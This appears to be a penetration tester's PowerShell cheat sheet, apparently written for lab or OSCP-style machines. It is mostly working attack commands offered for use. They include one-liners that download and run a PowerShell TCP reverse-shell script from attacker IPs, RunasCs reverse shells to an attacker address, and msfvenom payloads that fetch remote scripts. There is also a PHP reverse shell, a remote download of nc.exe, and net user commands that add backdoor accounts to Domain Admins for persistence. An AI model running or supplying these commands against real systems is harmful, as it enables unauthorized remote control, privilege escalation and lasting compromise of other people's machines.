# PowerShell tips

# Running a background process

This can be useful when you want to have multiple open shells but don’t feel like re-exploiting the foothold. you can replace the iex command with anything

```coffeescript
Start-Job -Command {iex (new-object net.webclient).downloadstring('http://10.10.16.58/Invoke-PowerShellTcp.ps1')}
```

Also useful for port forwarding

## Check Who is Running a Process

Say for instance you find port 8080 open on localhost. You can check if it is being run by system by listing the “Image Name” that is running the PID.

```coffeescript
Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4

> tasklist /fi "pid eq 4" 
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System                           4 Services                   0        156 K
```

In the above case, we see that PID 4 (port 8000) is being run as “System”

## Switch to a different user

Say you have a shell as a service account but have creds for someone with more priviledges. You could use Runascs.exe compiled from this [github repo](https://github.com/antonioCoco/RunasCs/tree/master). This command will give a reverse shell as c.bum

More options for switching a user here: [https://nohttps://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/tchxor.github.io/oscp-notes/4-win-privesc/14-runas/](https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/)

```coffeescript
.\Runascs.exe user pass powershell -r <attacker ip>:443

# https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
	Invoke-Runascs user passw powershell -r <attacker ip>:443
```

## Useful Aliases

```jsx
Import-Module -> ipmo
```

## PowerShell Sudo

This allows you to run commands at other users. it is the PowerShell equivalent of Sudo. (Note that Invoke-runascs.ps1 often works better)

```nasm
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```

You can do sudo through CMD as well

```jsx
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted
```

### Invoke-RunasCs.ps1

This one works good in ********************************Active Directory********************************. It might also work well in non-AD environments. IT JUST WORKS, USE IT:

```bash
import-module .\Invoke-RunasCs.ps1
Invoke-RunasCs username password whoami
```

## Persistence with users

You can use these commands to create a user with privileges so that you can maintain persistence on a system

```jsx
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add

# create AD user in powershell 
$strCLass = “User”
$StrName = “CN=MyNewUser”
$objADSI = [ADSI]”LDAP://ou=myTestOU,dc=nwtraders,dc=msft”
$objUser = $objADSI.create($strCLass, $StrName)
$objUser.Put(“sAMAccountName”, “MyNewUser”)
$objUser.setInfo()
```

# Reverse Shell

### MsfVenom command execution

You can execute commands through MsfVenom executables. This ones gives a powershell reverse shell.

```abap

#64 bit
msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://192.168.49.116/Invoke-PowerShellTcp.ps1')\"" -f exe > pay.exe

# 32 bit
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://192.168.49.116/Invoke-PowerShellTcp.ps1')\"" -f exe > pay.exe

# php reverse shell (works on windows)
msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
```

Also, this repo contains a PHP reverse shell that works for Windows, MacOS, and Linux.

[php-reverse-shell/php_reverse_shell.php at master · ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Keep in mind you’ll need to edit the connection variables

```abap
$sh = new Shell('YOUR_IP', 443);
```

## PowerShell One-liner

```abap
powershell IEX(New-Object Net.webclient).downloadstring('http://192.168.116.99/Invoke-PowerShellTcp.ps1')
```

[Windows Tips](PowerShell%20tips%206e3c0a69a96a4dfcb0ab888385c2aa34/Windows%20Tips%202538ffc0176f4fbaa8e586b5ac7bcd9b.md)

[AV Evasion](PowerShell%20tips%206e3c0a69a96a4dfcb0ab888385c2aa34/AV%20Evasion%205155892409db47278a8a9daa70d4587a.md)